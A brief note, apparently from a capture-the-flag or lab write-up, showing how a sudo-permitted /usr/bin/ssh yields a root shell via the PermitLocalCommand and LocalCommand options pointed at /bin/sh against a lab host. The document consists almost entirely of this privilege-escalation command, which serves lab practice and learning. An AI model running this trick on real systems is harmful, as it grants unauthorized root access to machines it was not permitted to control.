/usr/bin/ssh

```
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh josh@10.129.229.88
```

ssh -o can make permitlocalcommand=yes, which allow u to run /bin/sh leading to root